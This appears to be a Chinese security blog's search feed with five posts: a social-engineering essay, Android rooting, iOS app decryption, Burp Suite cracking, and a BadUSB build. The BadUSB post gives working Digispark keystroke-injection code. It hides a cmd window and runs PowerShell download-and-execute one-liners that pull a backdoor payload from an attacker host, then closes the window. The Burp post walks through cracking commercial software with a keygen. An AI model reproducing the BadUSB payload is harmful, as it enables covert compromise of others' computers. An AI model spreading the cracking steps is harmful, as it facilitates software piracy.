<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>关于社会工程学的一些个人看法</title>
    <url>/2023/04/23/%E5%85%B3%E4%BA%8E%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6%E7%9A%84%E4%B8%80%E4%BA%9B%E4%B8%AA%E4%BA%BA%E7%9C%8B%E6%B3%95/</url>
    <content><![CDATA[<p>从何讲起呢？<br>本人从上学时了解到社会工程学这门黑客学科<br>社会工程学是指，利用人性的弱点和特性，直接对目标相关的人进行社会关系和心理学的信息套取的手段。<br>主要行动方向有两条，一方面是从目标人物已经完成的社会行为中搜索关键信息，比如，找到目标人物的网络社交账号与发表的信息等。<br>另一方面是直接接触目标人物，通过语言或肢体交流进行信息套取，这里从广泛的意义上讲，电信诈骗也是应用案例之一。</p>
<p>我不想讲社工中的那些方法论，那些东西太死板，交给乙方公司的安服团队，公司会用这种方法完成他们的变现。</p>
<p>而我想表达的内容应该更适合还在学习社工，并纠结与社工工作的人。</p>
<p>首先要说的是，社工不难，而且很灵活，你通过自己的办法去发现那些信息就已经是天花板了。从互联网空间中能找到信息，一方面是互联网公司自身对客户的信息保护不够，另一方面是目标对自身信息的保护不够。<br>比如，你通过穷举法获取目标的平台账号密码，是互联网公司的措施不完善。<br>又比如，你在目标社交平台上发布的生活轨迹中发现关键信息，是目标本身对敏感信息的敏感度不足造成的。</p>
<p>而通过这两种思路，组合打法就能帮你获取到足够多的信息了。</p>
<p>之后要说的是，请你记住你要获取信息的目的，你只是想拿到那个password，或者拿到某个关键目标放在什么位置，或者是目标公司老板几点在公司这种信息而已。</p>
<p>而获取信息的渠道很多，你千万不要陷入到给获取目标渠道中的这个人的人物画像当中去，那不应该是你的主要工作。</p>
<p>可能护网工作会要求你充分溯源红队人员的个人信息，但你在做溯源的时候，只要知道是红队中的谁攻击，用的什么手段攻击即可。不需要疯狂地去完善报告中他的生活细节。可能你想通过这种方式来表现你的工作能力。<br>而护网中，真的没人在意这个人年龄多大，家里几个人，婚否，对象好不好看，喜不喜欢烟酒二次元等乱七八糟的事情。</p>
<p>因为当你花费了大量的时间在这上面，并把一份详细且完整的画像报告交上去时，你的主管回复你，你找错目标了。请问你花费的时间和精力要谁来买单呢？</p>
<p>不仅仅是护网工作，你会发现能用到社工手段的地方太多了，因为这个手段门槛太低，不需要你会多少计算机语言，不需要你懂不懂什么OSI七层协议框架。你只要动手去做，无论找不找得到目标信息，你都会有一定的收获。</p>
<p>比如，你很想知道喜欢的人，这个人网络上发布了什么，喜好什么，最近在做什么。你很强，你把这些信息都拿到了，然后呢？你会发现一个很严重的问题，这些信息要怎么利用？这些信息是否真实？这些信息有多少是他想表现在网络上，而真正的信息都藏起来根本不会发布。</p>
<p>于是你又开始分析信息，分析行为，分析社会关系，甚至开始根据这些信息开始侧写。</p>
<p>这个时候，如果你不是为了相关工作去调查犯罪嫌疑人，那你已经是一个不折不扣的大变态了。</p>
<p>你只是为了满足你那肮脏不堪的窥私欲而已。</p>
<p>这些信息看得多了，你会发现人性的不堪，因为你会发现很多人被自身的欲望裹挟而做出的徘徊于人性边缘的事情。你开始会对每一个人都保持距离感，并对人性保持一种相当的怀疑态度。</p>
<p>没错，你走火入魔了，你太依赖于社会工程学了。</p>
<p>我要说的是，社工是一门手段，但不是万金油。</p>
<p>企业可以通过相应的管理制度来规避社工攻击带来的风险，人本身也可以通过学习相关知识并改变生活中的一些行为来规避社工攻击。同时，我上面讲过，人在网络上表达的内容仅仅是想让你看到的内容，那并不是真实的。</p>
<p>以上，</p>
<p>在我对自身的社工防范手段做到位了之后，就不在社工这件事本身再投入精力了。</p>
<p>毕竟把太多的精力放在对人的信息挖掘上，目光未免太过狭窄。</p>
<p>地球在宇宙中存在了46亿年，陆地总面积约14900万平方千米，地球总人口约78.88亿，人类平均寿命大约是76岁，你大约已经用掉了30%，那么你大约还有五十多年的时间，去了解历史、丈量土地、遇见更多的人。</p>
<p>在此希望你能为祖国健康工作50年。</p>
]]></content>
  </entry>
  <entry>
    <title>Android刷机流程</title>
    <url>/2023/04/23/Android%E5%88%B7%E6%9C%BA%E6%B5%81%E7%A8%8B/</url>
    <content><![CDATA[<p>才想起来要把这件事写下来，好久之前就答应人家写下来的。</p>
<blockquote>
<p>买了个谷歌龟儿子pixel 3XL用来做app渗透测试，期间给手机进行root的过程耗费了好多事情</p>
</blockquote>
<p>手机：pixel 3XL<br>电脑：这个随意，windows、linux、mac都能操作</p>
<p>已知的刷机路线有两个：</p>
<ol>
<li>刷入原生Android ，安装一个第三方系统，比如lineageOS，再刷TWRP</li>
<li>刷入原生Android12.，刷入pixeldust，安装KernelSU，</li>
</ol>
<p>我个人选择的是第一个办法<br>手机用谷歌pixel 3XL，刷入原生安卓11+第三方lineageOS，再刷入面具来实现root。</p>
<h3 id="刷机："><a href="#刷机：" class="headerlink" title="刷机："></a>刷机：</h3><p>首先打开手机的开发者选项，<br>设置-&gt;系统-&gt;关于手机-&gt;多次点击“版本号”，直到显示“已处于开发者模式”</p>
<figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/Android_root/Pasted image 20230306160444.9m0oq1pi7ac.webp"
                      alt="Pasted image 20230306160444" 
                ><figcaption>Pasted image 20230306160444</figcaption></figure>

<p>返回上一级，找到“开发者选项“-&gt;USB调试</p>
<p>插上usb线后，会显示”允许USB调试吗？“<br>此后每次运行命令 adb devices<br>都会出现该弹框</p>
<figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/Android_root/Pasted image 20230306145705.2265vt2xb0w0.webp"
                      alt="Pasted image 20230306145705" 
                ><figcaption>Pasted image 20230306145705</figcaption></figure>

<p>开发者选项中，还有一项OEM解锁，这项务必选中，否则后面的刷机不会成功。</p>
<p>接下来是下载对应的官方镜像包<br><a class="link"   href="https://source.android.com/docs/setup/about/build-numbers?hl=zh-cn#source-code-tags-and-builds" >https://source.android.com/docs/setup/about/build-numbers?hl=zh-cn#source-code-tags-and-builds <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>找到手机适用的镜像版本，记录下来，找到镜像，下载</p>
<figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/Android_root/Pasted image 20230306150338.6bu5zvyckss0.webp"
                      alt="Pasted image 20230306150338" 
                ><figcaption>Pasted image 20230306150338</figcaption></figure>
<figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/Android_root/Pasted image 20230207170145.3gnt4ecijr60.webp"
                      alt="Pasted image 20230207170145" 
                ><figcaption>Pasted image 20230207170145</figcaption></figure>

<p>接下来只要解压zip文件，找到压缩包中的flash-all.sh这个线刷脚本直接运行就好了，该脚本会自动完成系统的安装</p>
<figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/Android_root/Pasted image 20230306150646.44f2f7hbt2s0.webp"
                      alt="Pasted image 20230306150646" 
                ><figcaption>Pasted image 20230306150646</figcaption></figure>
<figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/Android_root/Pasted image 20230306150634.4jil6tei1je0.webp"
                      alt="Pasted image 20230306150634" 
                ><figcaption>Pasted image 20230306150634</figcaption></figure>

<p>刷好后，我们获得一台崭新的手机（系统层面），稍微设置一下初始设定，打开wifi，并重新开启开发者模式和usb调试。</p>
<h3 id="第三方系统刷入"><a href="#第三方系统刷入" class="headerlink" title="第三方系统刷入"></a>第三方系统刷入</h3><p>此时要注意，我们不得不选择一款第三方系统进行刷入<br>由twrp的描述得知，想要在pixel 3XL中刷入twrp，必须先刷入一个第三方系统，之后才能完成twrp的刷入，而twrp的刷入，是root不可缺少的一环。</p>
<p>这里我选择的是LineageOS</p>
<figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/Android_root/Pasted image 20230207164545.4f2dyel4zsa0.webp"
                      alt="Pasted image 20230207164545" 
                ><figcaption>Pasted image 20230207164545</figcaption></figure>
<figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/Android_root/Pasted image 20230207164559.uf4snjq46yo.webp"
                      alt="Pasted image 20230207164559" 
                ><figcaption>Pasted image 20230207164559</figcaption></figure>

<p>同样的，要根据手机型号和当前刷入的系统版本来确定LineageOS的版本。<br>刷入流程与官方系统的刷入流程类似，LineageOS官方的指导中也介绍了系统的安装流程，此处不赘述。</p>
<h3 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h3><p>TWRP刷入<br>Team Win Recovery Project，一个开源软件定制recovery映像，主要是用来刷root的，当然也可以用来干别的，比如可以刷kali系统，等我以后会有机会买到合适的机型。<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/Android_root/Pasted image 20230207164753.1wdwu17q4gg0.webp"
                      alt="Pasted image 20230207164753" 
                ><figcaption>Pasted image 20230207164753</figcaption></figure><br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/Android_root/Pasted image 20230207171229.63diok6bpdc0.webp"
                      alt="Pasted image 20230207171229" 
                ><figcaption>Pasted image 20230207171229</figcaption></figure></p>
<p>这里要注意的是，选择映像，要多根据版本多试几个，还要搞懂当前手机是欧版（欧洲卖的）还是美版（美国卖的）</p>
<p>进入bootloader界面，使用fastboot将相应的twrp刷入，</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">adb reboot bootloader</span><br><span class="line">fastboot recovery twrp-3.5.2_10-0-crosshatch.img</span><br></pre></td></tr></table></figure></div>

<p>进入twrp界面，通过音量键向上或者向下，找到recovery mode，点击电源键确认，即可进入twrp<br>使用adb，将root工具推入手机中的&#x2F;sdcard目录下，root工具到github上找Magisk，就是大名鼎鼎的面具。</p>
<figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/Android_root/Pasted image 20230306153047.29go2c04i5wk.webp"
                      alt="Pasted image 20230306153047" 
                ><figcaption>Pasted image 20230306153047</figcaption></figure>

<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">adb push Magisk-v25.2.zip</span><br></pre></td></tr></table></figure></div>
<p>面具官网中也有比较详细的安装流程，与我介绍的不一样，可以参考。<a class="link"   href="https://topjohnwu.github.io/Magisk/install.html" >https://topjohnwu.github.io/Magisk/install.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>在TWRP的界面中，选择install，到面具所在的目录中找到Magicsk-v25.2.zip。<br>点击Install Image，静静等待，代码滚动，直到done的出现<br>然后Reboot System</p>
<p>此时打开手机，app列表中会有一个面具app，使用adb进行连接，输入adb shell，再输入su，会提示root申请，允许，root权限获取。</p>
<h3 id="另一种办法"><a href="#另一种办法" class="headerlink" title="另一种办法"></a>另一种办法</h3><p>这个办法我没尝试过，这种办法适用于Android12及以后的系统，具体原因如下：</p>
<figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/Android_root/Pasted image 20230207170444.6ho6geqz490.webp"
                      alt="Pasted image 20230207170444" 
                ><figcaption>Pasted image 20230207170444</figcaption></figure>


<p>应对这种情况，就要使用KernelSU为中心的root解决方案<br>安装步骤比上一种简单很多，但我已经root成功了，也不想尝试Android12系统，故方法留给有缘人。</p>
<p>pixeldust<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/Android_root/Pasted image 20230207163923.7df9bkfpbkk0.webp"
                      alt="Pasted image 20230207163923" 
                ><figcaption>Pasted image 20230207163923</figcaption></figure><br> KernelSU<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/Android_root/Pasted image 20230207164856.rd1teg95uf4.webp"
                      alt="Pasted image 20230207164856" 
                ><figcaption>Pasted image 20230207164856</figcaption></figure></p>
<h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>总的来说，安卓刷机root是一个很麻烦又不得不进行的流程，为了以后安卓渗透和逆向的大业。我们不得不这么吐了血的折腾一次。<br>那么有没有办法让我们把用在刷机的精力节省下来呢？</p>
<p>有！</p>
<p>这位帅比大神专注于谷歌手机的刷机与root<br>并能够提供大量的pixel各种型号的手机<br>你可以直接在他这里买到root好的pixel手机<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/Android_root/Pasted image 20230306154731.5x7dtv91n5w0.webp"
                      alt="Pasted image 20230306154731" 
                ><figcaption>Pasted image 20230306154731</figcaption></figure><br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/Android_root/Pasted image 20230306154745.dw0lquwo76g.webp"
                      alt="Pasted image 20230306154745" 
                ><figcaption>Pasted image 20230306154745</figcaption></figure><br>他的微信二维码就留在这里了，加他，叫我白天的名字有彩蛋。</p>
<p>P.S.我的pixel 3XL在他这里买的，当年买的9成新二手，三百多</p>
<p>竟然还能跑原神</p>
]]></content>
  </entry>
  <entry>
    <title>BadUSB制作过程-基于Digispark</title>
    <url>/2023/04/23/BadUSB%E5%88%B6%E4%BD%9C%E8%BF%87%E7%A8%8B-%E5%9F%BA%E4%BA%8EDigispark/</url>
    <content><![CDATA[<blockquote>
<p>一直就很想做一个BadUSB于是就做了一个BadUSB……</p>
</blockquote>
<h1 id="基于Attiny85和digispark"><a href="#基于Attiny85和digispark" class="headerlink" title="基于Attiny85和digispark"></a>基于Attiny85和digispark</h1><h2 id="首先是原料，上链接："><a href="#首先是原料，上链接：" class="headerlink" title="首先是原料，上链接："></a>首先是原料，上链接：</h2><p>硬件：<br>Attiny85：<a class="link"   href="https://m.tb.cn/h.fg5Xm3W?sm=0be9e8" >https://m.tb.cn/h.fg5Xm3W?sm=0be9e8 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>软件：<br>IDE：<a class="link"   href="https://www.arduino.cc/en/software" >https://www.arduino.cc/en/software <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>驱动：<a class="link"   href="https://github.com/digistump/DigistumpArduino/releases" >https://github.com/digistump/DigistumpArduino/releases <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>指令转译：<a class="link"   href="https://github.com/Catboy96/Automator" >https://github.com/Catboy96/Automator <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="开发板编程环境部署"><a href="#开发板编程环境部署" class="headerlink" title="开发板编程环境部署"></a>开发板编程环境部署</h2><p>首先是下载驱动和arduino，并安装  </p>
<p>点击File-&gt;Preferences,在最下面的输入栏里填写开发板管理的链接</p>
<p><a class="link"   href="http://digistump.com/package_digistump_index.json" >http://digistump.com/package_digistump_index.json <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>  </p>
<p>点击 Tools-&gt;Board-&gt;Boards Manager<br>然后在搜索栏里输入digistump，不用写完整自动找到，下载第一个  </p>
<p>下载结束后，在上方栏选择开发板，找到Digispark（Default-16.5mhz）  </p>
<p>之后就是编程环节了<br>这里的逻辑是：仿HID，打开cmd-&gt;输入命令下载木马并使用powershell执行-&gt;关闭窗口  </p>
<p>不同的大佬使用的不同的代码来隐藏窗口运行powershell<br>比如雷神众测的文章用的是</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">Powershell IEX(New-Object Net.WebClient).DownloadString(&#x27;http://IP:port/sys_dll.ps1&#x27;);</span><br></pre></td></tr></table></figure></div>


<p>也有大佬使用</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">powershell -WindowStyle Hidden -NoLogo -executionpolicy bypass IEX(New-Object Net.WebClient).DownloadString(&#x27;http://服务器ip:8000/生成的后门&#x27;);</span><br></pre></td></tr></table></figure></div>


<p>各有春秋</p>
<p>我用的是</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">echo set-alias -name rookie -value Invoke-Expression;rookie(new-object net.webclient).downloadstring(&#x27;http://ip:port/payload.ps1&#x27;) | powershell -&quot;);</span><br></pre></td></tr></table></figure></div>

<p>哪个好用就由后来人说吧，反正目的都是一样的。</p>
<p>附上代码</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;DigiKeyboard.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">setup</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">   <span class="comment">// put your setup code here, to run once:  </span></span><br><span class="line">   DigiKeyboard.<span class="built_in">delay</span>(<span class="number">2000</span>);<span class="comment">//为等待2秒  </span></span><br><span class="line">   DigiKeyboard.<span class="built_in">sendKeyStroke</span>(KEY_R, MOD_GUI_LEFT);<span class="comment">//发送win+R  </span></span><br><span class="line">   DigiKeyboard.<span class="built_in">delay</span>(<span class="number">800</span>);  </span><br><span class="line">   DigiKeyboard.<span class="built_in">println</span>(<span class="string">&quot;cmd /T:01 /K mode CON: COLS=16 LINES=1&quot;</span>);<span class="comment">//将cmd窗口最小化保证隐蔽性  </span></span><br><span class="line">   DigiKeyboard.<span class="built_in">delay</span>(<span class="number">2000</span>);  </span><br><span class="line">   DigiKeyboard.<span class="built_in">println</span>(<span class="string">&quot;echo set-alias -name rookie -value Invoke-Expression;rookie(new-object net.webclient).downloadstring(&#x27;http://ip:port/payload.ps1&#x27;) | powershell -&quot;</span>);<span class="comment">//要执行的payload  </span></span><br><span class="line">   DigiKeyboard.<span class="built_in">delay</span>(<span class="number">3500</span>); </span><br><span class="line">   DigiKeyboard.<span class="built_in">sendKeyStroke</span>(KEY_F4, MOD_ALT_LEFT);<span class="comment">//执行完成后alt+F4关闭窗口</span></span><br><span class="line">   &#125; </span><br><span class="line">   <span class="function"><span class="type">void</span> <span class="title">loop</span><span class="params">()</span> </span></span><br><span class="line"><span class="function">   </span>&#123;  </span><br><span class="line">      <span class="comment">// put your main code here, to run repeatedly: </span></span><br><span class="line">   &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>关于有的大佬说使用Automator这个工具方便键入命令，个人感觉吧，不好用，如不认真学习HID的协议  </p>
<h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.staticaly.com/gh/BrathonBai/ImgHS@main/content/badusb/image-80ffa4e019054a95bbabaf6e906263b7.41i3rn34x620.webp"
                      alt="image-80ffa4e019054a95bbabaf6e906263b7"
                ><figcaption>image-80ffa4e019054a95bbabaf6e906263b7</figcaption></figure></p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.staticaly.com/gh/BrathonBai/ImgHS@main/content/badusb/image-2412be2afe5742629538262be0d454d7.2immd9he0i00.webp"
                      alt="image-2412be2afe5742629538262be0d454d7"
                ><figcaption>image-2412be2afe5742629538262be0d454d7</figcaption></figure></p>
<h2 id="遗留问题"><a href="#遗留问题" class="headerlink" title="遗留问题"></a>遗留问题</h2><p>中英文切换与大小写，&lt;DigiKeyboard.h&gt;中似乎没有CapsLocks</p>
<p>在github上发现有大佬回答使用57来完成大小写切换，在windows上不区分大小写，所以换用大写后可以避免中文输入法带来的困扰。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line">DigiKeyboard.<span class="built_in">sendKeyStroke</span>(<span class="number">57</span>);</span><br></pre></td></tr></table></figure></div>

<p>也有大佬提出，使用ctrl+space来切换输入法</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line">DigiKeyboard.<span class="built_in">sendKeyStroke</span>(KEY_SPACE, MOD_CONTROL_LEFT);</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>参考<br><a class="link"   href="https://www.cnblogs.com/qianxiao996/p/13574566.html" >https://www.cnblogs.com/qianxiao996/p/13574566.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   href="https://mp.weixin.qq.com/s/A8KaMP-AJsuZSyyR6Zs1UA" >https://mp.weixin.qq.com/s/A8KaMP-AJsuZSyyR6Zs1UA <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
  </entry>
  <entry>
    <title>ipa从获取到砸壳</title>
    <url>/2023/04/23/ipa%E4%BB%8E%E8%8E%B7%E5%8F%96%E5%88%B0%E7%A0%B8%E5%A3%B3/</url>
    <content><![CDATA[<p>一台mac，一部越了狱的iphone<br>Mac mini m1<br>iphone8  iOS1 3.7</p>
<h3 id="获取ipa"><a href="#获取ipa" class="headerlink" title="获取ipa"></a>获取ipa</h3><p>apple configurator 2获取ipa<br>注意<br>～&#x2F;Library&#x2F;Group Containers&#x2F;K36BKF7T3D.group.com.apple.configurator&#x2F;Library&#x2F;Caches&#x2F;Assets<br>这个文件夹下的内容</p>
<p>只要这个目录出现TemporaryItems,那就代表ipa包下载完成了,立马复制粘贴这个文件.当然也可以进去找到ipa包复制出来.还是那句话,手速快网差还没下载完没有目录,网快手速慢等你去找目录,或者复制文件的时候,同步安装已经完成.临时目录就会被删除找不到ipa包</p>
<h3 id="砸壳"><a href="#砸壳" class="headerlink" title="砸壳"></a>砸壳</h3><p>pc端和手机端分别安装frida<br>这一块不在这里教<br>开俩terminal，一个跑frida，另一个ssh到iphone</p>
<p>从github下载工程：一般情况使用最新的版本，master分支对应Python2，3.x对应Python3版本。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/AloneMonkey/frida-ios-dump </span><br></pre></td></tr></table></figure></div>

<p>安装依赖：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd frida-ios-dump</span><br><span class="line">sudo pip3 install -r requirements.txt --upgrade</span><br></pre></td></tr></table></figure></div>

<p>修改dump.py参数：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim frida-ios-dump/dump.py</span><br></pre></td></tr></table></figure></div>

<p>找到如下几行</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">User = &#x27;root&#x27;   </span><br><span class="line">Password = &#x27;xxxxxxxxxx&#x27;   </span><br><span class="line">Host = &#x27;localhost&#x27;   </span><br><span class="line">Port = 2222   </span><br></pre></td></tr></table></figure></div>

<p>修改Password和端口号。和iproxy命令端口号保持一致。</p>
<p>列举出安装的应用的名字和bundle id</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd frida-ios-dump</span><br><span class="line">python3 dump.py -l</span><br></pre></td></tr></table></figure></div>

<ul>
<li>执行dump命令</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 dump.py id</span><br></pre></td></tr></table></figure></div>

<p>这里的id是com.apple.xxxxxx这样的</p>
<p>砸完壳的ipa在frida-ios-dump文件夹下</p>
]]></content>
  </entry>
  <entry>
    <title>破解，再给新下载的burp加个快捷方式</title>
    <url>/2023/04/23/%E7%A0%B4%E8%A7%A3%EF%BC%8C%E5%86%8D%E7%BB%99%E6%96%B0%E4%B8%8B%E8%BD%BD%E7%9A%84burp%E5%8A%A0%E4%B8%AA%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F/</url>
    <content><![CDATA[<blockquote>
<p>拜托，有个双击就可以打开的burp真的很酷好吗？</p>
</blockquote>
<p>咱就是说，在kali和mac上使用burp有那么些不自然</p>
<h2 id="破解"><a href="#破解" class="headerlink" title="破解"></a>破解</h2><p>通常呢，咱们都是在52破解下载最新版的burpsuite<br><a class="link"   href="https://down.52pojie.cn/Tools/Network_Analyzer/Burp_Suite_Pro_v2022.2.2_Loader_Keygen.zip" >https://down.52pojie.cn/Tools/Network_Analyzer&#x2F;Burp_Suite_Pro_v2022.2.2_Loader_Keygen.zip <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>但52破解的破解器总是用的1.7版本，有些功能真的跟不上</p>
<p>所以，咱们直接从官方下载正式版的pro<br>然后去全球最大的同性交友网站找到最新的keygen<br>之后怎么做不用我介绍了吧<br>之后的破解流程就没啥好说的了，破解器作者已经表述得很详尽了</p>
<p>下载链接留这里<br>burpsuite pro：<a class="link"   href="https://portswigger.net/burp/pro" >https://portswigger.net/burp/pro <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>Keygen：<a class="link"   href="https://github.com/h3110w0r1d-y/BurpLoaderKeygen/releases" >https://github.com/h3110w0r1d-y/BurpLoaderKeygen/releases <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="制作快捷方式"><a href="#制作快捷方式" class="headerlink" title="制作快捷方式"></a>制作快捷方式</h2><p>把文件移动到&#x2F;usr&#x2F;bin目录中</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mv</span> BurpLoaderKeygen.jar burpsuite_pro_v2022.2.2.jar /usr/bin</span><br></pre></td></tr></table></figure></div>

<p>先删掉免费的社区版本</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">apt remove burpsuite</span><br></pre></td></tr></table></figure></div>

<p>配置快捷方式:<br>在&#x2F;usr&#x2F;bin下创建burpsuite</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">vim burpsuite</span><br></pre></td></tr></table></figure></div>

<p>将keygen上的loader commond复制粘贴</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">/usr/lib/jvm/java-17-openjdk-amd64/bin/java --add-opens=java.desktop/javax.swing=ALL-UNNAMED --add-opens=java.base/java.lang=ALL-UNNAMED -javaagent:/usr/bin/BurpLoaderKeygen.jar -noverify -jar /usr/bin/burpsuite_pro_v2022.2.2.jar</span><br></pre></td></tr></table></figure></div>

<p>增加执行权限,进入&#x2F;usr&#x2F;share&#x2F;applications，创建并编辑burpsuite的快捷方式</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x burpsuite</span><br><span class="line"><span class="built_in">cd</span> /usr/share/applications/</span><br><span class="line">vim burpsuite.desktop</span><br></pre></td></tr></table></figure></div>

<p>填入代码</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">[Desktop Entry]</span><br><span class="line">Name=burpsuite</span><br><span class="line">Encoding=UTF-8</span><br><span class="line">Exec=sh -c <span class="string">&quot;/usr/bin/burpsuite&quot;</span></span><br><span class="line">Icon=kali-burpsuite</span><br><span class="line">StartupNotify=<span class="literal">false</span></span><br><span class="line">Terminal=<span class="literal">false</span></span><br><span class="line">Type=Application</span><br><span class="line">Categories=03-webapp-analysisc;03-06-web-application-proxies;</span><br><span class="line">X-Kali-Package=burpsuite</span><br></pre></td></tr></table></figure></div>

<p>ok</p>
<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>2022.9版本的破解有些改变，根据沈沉舟大佬的描述：</p>
<blockquote>
<p>“2022.9版注册机制并未发生变化，仅仅是相关代码具体实现做了微调，导致class的字节码发生变化，而旧版loader模式匹配时约束条件太强，兼容性不足。”</p>
</blockquote>
<p>故新版本的破解流程稍有更改</p>
<p>首先把需要的部分下载一下，我用的是mac，理论上比linux和win那边麻烦点（实际操作的时候也是很麻烦）  </p>
<p>安装好app后，右键查看包内容，把loader和keygen移动到app路径下，主要是放在burpsuite旁边  </p>
<p>由于这个loader名字太难打，咱直接改名burploader<br>右键打开terminal，命令启动burpsuite和keygen</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">java -jar BurpLoaderKeygen.jar</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">java -javaagent:burploader.jar -noverify -jar burpsuite_pro.jar</span><br></pre></td></tr></table></figure></div>

<p>后面注册的过程都是一样的，咱直接跳到关键过程<br>注册成功后从启动台打开还是app还是没注册的样子  </p>
<p>咱还是进入包内容，添加点内容</p>
